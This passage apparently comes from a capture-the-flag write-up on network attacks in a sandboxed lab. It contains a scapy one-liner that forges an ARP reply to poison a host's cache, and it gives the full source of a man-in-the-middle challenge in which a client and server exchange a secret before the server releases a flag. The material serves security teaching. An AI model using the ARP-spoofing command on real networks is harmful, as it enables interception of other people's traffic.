network = Network(hosts={user_host: "10.0.0.1",
                         client_host: "10.0.0.2",
                         server_host: "10.0.0.3"},
                  subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```




```
sendp(Ether(src="1e:a8:ee:bd:f7:d4", dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="10.0.0.3", hwsrc="1e:a8:ee:bd:f7:d4", pdst="10.0.0.2", hwdst="ff:ff:ff:ff:ff:ff")), iface="eth0")
```

&nbsp;

## Man-in-the-Middle

> Man-in-the-middle traffic from a remote host. The remote host at 10.0.0.2 is communicating with the remote host at 10.0.0.3 on port 31337.

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import multiprocessing
import os
import socket
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class AuthenticatedClientHost(Host):
    def entrypoint(self):
        while True:
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.3", 31337))

                assert client_socket.recv(1024) == b"secret: "
                secret = bytes(server_host.secret)  # Get the secret out-of-band
                time.sleep(1)
                client_socket.sendall(secret.hex().encode())

                assert client_socket.recv(1024) == b"command: "
                time.sleep(1)
                client_socket.sendall(b"echo")
                time.sleep(1)
                client_socket.sendall(b"Hello, World!")
                assert client_socket.recv(1024) == b"Hello, World!"

                client_socket.close()
                time.sleep(1)

            except (OSError, ConnectionError, TimeoutError, AssertionError):
                continue

class AuthenticatedServerHost(Host):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.secret = multiprocessing.Array("B", 32)

    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()

                self.secret[:] = os.urandom(32)
                time.sleep(1)
                connection.sendall(b"secret: ")
                secret = bytes.fromhex(connection.recv(1024).decode())
                if secret != bytes(self.secret):
                    connection.close()
                    continue

                time.sleep(1)
                connection.sendall(b"command: ")
                command = connection.recv(1024).decode().strip()

                if command == "echo":
                    data = connection.recv(1024)
                    time.sleep(1)
                    connection.sendall(data)
                elif command == "flag":
                    time.sleep(1)
                    connection.sendall(flag.encode())

                connection.close()
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
client_host = AuthenticatedClientHost("ip-10-0-0-2")
server_host = AuthenticatedServerHost("ip-10-0-0-3")
network = Network(hosts={user_host: "10.0.0.1",
                         client_host: "10.0.0.2",
                         server_host: "10.0.0.3"},
                  subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```
